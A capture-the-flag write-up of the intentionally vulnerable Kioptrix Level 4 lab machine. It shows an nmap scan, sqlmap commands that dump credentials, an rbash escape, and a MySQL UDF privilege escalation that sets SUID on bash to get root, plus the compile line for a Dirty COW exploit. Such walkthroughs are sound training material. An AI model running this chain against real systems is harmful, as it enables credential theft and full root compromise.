<h1>Kioptrix: Level 4 Write-up</h1>

<h2>NMAP</h2>

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

<h4>PORT 80</h4>

**Sql Injection on ligGoat:**

sqlmap :

```
sqlmap --url "http://192.168.43.46/index.php" --form 
sqlmap --url "http://192.168.43.46/index.php" --form --dbs
sqlmap --url "http://192.168.43.46/index.php" --form -D members --dump
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%204/Images/sqlmap.png)

```
Creds : 
john : MyNameIsJohn
robert : ADGAdsafdfwt4gadfga==
```


<h3>Login to ssh using john creds and rbash shell escape</h3>

```echo os.system("/bin/bash")```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%204/Images/shell%20escape.png)

<h2>Privilege Escalation:</h2>

<h3>Method 1</h3>

**MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux**

Source : https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/

```
mysql -u root -p
mysql> use mysql;
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod u+s /bin/bash');
```

```
bash-3.2$ ls -l /bin/bash
-rwsr-xr-x 1 root root 702160 2008-05-12 14:33 /bin/bash
bash-3.2$ bash -p
bash-3.2# whoami
root
```

<h3>Method 2</h3>

Exploit : https://www.exploit-db.com/exploits/40839

Compile exploit in your pc with :

```gcc -pthread dirty.c -o dirty -lcrypt -m32```


and transfer in Kioptrix 


![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%204/Images/rooted.png)
